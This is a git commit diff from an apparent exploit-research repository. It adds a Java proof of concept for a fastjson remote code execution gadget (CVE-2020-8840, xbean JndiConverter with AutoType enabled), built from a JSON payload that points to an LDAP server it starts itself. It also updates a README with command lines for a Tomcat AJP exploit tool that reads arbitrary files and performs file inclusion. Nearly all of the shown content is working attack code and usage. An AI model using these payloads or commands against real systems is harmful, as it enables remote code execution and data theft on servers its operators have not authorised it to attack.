58b52222a1d2b68ee8c5ae959739ac375da3a002
threedr3am <929811313@qq.com>
2020-02-23 16:58:03 +0800

    feat:去除项目冗余 & 添加fastjson gadget

---
+++ fastjson/src/main/java/com/threedr3am/bug/fastjson/JndiConverterPoc.java
@@ -0,0 +1,36 @@
+package com.threedr3am.bug.fastjson;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+import com.threedr3am.bug.common.server.LdapServer;
+
+/**
+ * fastjson <= 1.2.62 RCE，需要开启AutoType
+ *
+ * Jackson-databind的CVE-2020-8840 gadget与Fastjson通用
+ *
+ * XBean-reflect依赖的gadget
+ *
+ * <dependency>
+ *       <groupId>org.apache.xbean</groupId>
+ *       <artifactId>xbean-reflect</artifactId>
+ * </dependency>
+ *
+ * @author threedr3am
+ */
+public class JndiConverterPoc {
+  static {
+    //rmi server示例
+//    RmiServer.run();
+
+    //ldap server示例
+    LdapServer.run();
+  }
+
+  public static void main(String[] args) {
+    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+
+    String payload = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:43658/Calc\"}";//ldap方式
+    JSON.parse(payload);
+  }
+}
--- tomcat/ajp-bug/README.md
+++ tomcat/ajp-bug/README.md
@@ -1,9 +1,12 @@
 任意文件读取
+
 java -jar ajp-bug-1.0-SNAPSHOT-jar-with-dependencies.jar 127.0.0.1 8009 file /index.jsp
 
 文件包含
+
 java -jar ajp-bug-1.0-SNAPSHOT-jar-with-dependencies.jar 127.0.0.1 8009 jsp /index.jsp
 
 打包方式：
+
 在目录tomcat/ajp-bug
 执行 mvn clean compile assembly:assembly
